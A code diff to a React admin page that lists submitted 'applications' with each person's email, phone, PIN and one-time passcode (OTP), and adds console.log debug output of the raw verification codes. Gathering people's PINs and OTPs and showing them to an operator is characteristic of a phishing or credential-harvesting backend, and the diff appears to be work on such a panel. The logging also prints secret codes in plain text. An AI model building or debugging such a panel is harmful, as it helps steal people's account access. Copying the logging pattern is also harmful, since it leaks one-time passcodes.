@@ -518,7 +518,22 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
             <div className="mt-4 rounded-2xl border border-slate-200 bg-slate-50 p-6 text-sm text-slate-600">No submissions yet.</div>
           ) : (
             <div className="mt-4 space-y-3">
-              {applications.map((app) => (
+              {applications.map((app) => {
+                const pinValue = app.pin || '—';
+                const otpValue = app.otp || '—';
+                console.log('[ADMIN][PIN DEBUG]', {
+                  rawVerificationCode: app.verificationCode,
+                  rawVerification_code: app.verification_code,
+                  normalizedVerificationCode: app.verificationCode,
+                  renderedValue: pinValue,
+                });
+                console.log('[ADMIN][OTP DEBUG]', {
+                  rawVerificationCode: app.verificationCode,
+                  rawVerification_code: app.verification_code,
+                  normalizedVerificationCode: app.verificationCode,
+                  renderedValue: otpValue,
+                });
+                return (
                 <div key={app.id} className="rounded-2xl border border-slate-200 p-4">
                   <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                     <div>
@@ -531,12 +546,13 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
                     <div className="rounded-xl bg-slate-50 p-3 text-sm text-slate-700">
                       <div><strong className="text-slate-900">Email:</strong> {app.email || 'Not provided'}</div>
                       <div className="mt-1"><strong className="text-slate-900">Phone:</strong> {app.phone || '—'}</div>
-                      <div className="mt-1"><strong className="text-slate-900">PIN:</strong> {app.pin || '—'}</div>
-                      <div className="mt-1"><strong className="text-slate-900">OTP:</strong> {app.otp || '—'}</div>
+                      <div className="mt-1"><strong className="text-slate-900">PIN:</strong> {pinValue}</div>
+                      <div className="mt-1"><strong className="text-slate-900">OTP:</strong> {otpValue}</div>
                     </div>
                   </div>
                 </div>
-              ))}
+                );
+              })}
             </div>
           )}
         </section>
